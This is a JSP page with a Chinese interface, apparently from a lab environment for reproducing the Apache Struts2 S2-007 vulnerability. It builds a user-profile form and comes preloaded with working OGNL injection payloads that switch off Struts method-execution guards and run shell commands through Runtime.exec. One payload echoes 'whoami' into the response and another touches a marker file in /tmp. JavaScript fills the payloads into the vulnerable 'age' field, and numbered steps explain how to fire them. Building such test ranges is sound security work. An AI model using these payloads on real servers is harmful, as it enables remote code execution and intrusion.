<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-007 用户资料页</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .hint { color: #6b7280; }
        .errors { color: #a32626; margin-bottom: 12px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; background: #e6f2ef; color: #155b52; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; width: 100%; box-sizing: border-box; }
        code { font-family: Consolas, monospace; }
        p, li { line-height: 1.75; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-007 用户资料页</h1>
        <p class="hint"><code>age</code> 是 <code>Integer</code>，并且配置了 <code>UserAction-validation.xml</code>。让它发生类型转换失败，就会进入 S2-007 的危险路径。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('echo')">回显 whoami</button>
            <button type="button" class="preset-btn" onclick="fillPreset('touch')">touch 标记文件</button>
        </div>
        <div class="field">
            <label for="payloadBox">快捷测试 Payload</label>
            <textarea id="payloadBox">' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,#cmd='whoami',#p=@java.lang.Runtime@getRuntime().exec(#cmd),#in=new java.io.BufferedReader(new java.io.InputStreamReader(#p.getInputStream())),#buf=new char[256],#len=#in.read(#buf),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#buf,0,#len)),#out.close()) + '</textarea>
        </div>
        <div class="errors">
            <s:actionerror/>
            <s:fielderror/>
        </div>
        <s:form id="userForm" action="user" method="post">
            <s:textfield id="nameField" name="name" label="姓名"/>
            <s:textfield id="emailField" name="email" label="邮箱"/>
            <s:textfield id="ageField" name="age" label="年龄"/>
            <s:submit value="提交资料"/>
        </s:form>
    </div>
    <div class="card">
        <h2>说明</h2>
        <ol>
            <li>先把 payload 放进 <code>age</code>。</li>
            <li>提交后先发生类型转换异常，再命中校验器。</li>
            <li>如果漏洞命中，OGNL 会在错误处理流程里被再次执行。</li>
        </ol>
    </div>
</div>
<script>
    const payloads = {
        echo: '\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,#cmd=\'whoami\',#p=@java.lang.Runtime@getRuntime().exec(#cmd),#in=new java.io.BufferedReader(new java.io.InputStreamReader(#p.getInputStream())),#buf=new char[256],#len=#in.read(#buf),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#buf,0,#len)),#out.close()) + \'',
        touch: '\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec(\'touch /tmp/struts2-s2-007-success\')) + \''
    };

    function fillPreset(key) {
        const payload = payloads[key];
        document.getElementById('payloadBox').value = payload;
        document.getElementById('ageField').value = payload;
        document.getElementById('nameField').value = 'demo';
        document.getElementById('emailField').value = 'demo@example.com';
    }

    document.getElementById('payloadBox').addEventListener('input', function(event) {
        document.getElementById('ageField').value = event.target.value;
    });

    fillPreset('echo');
</script>
</body>
</html>
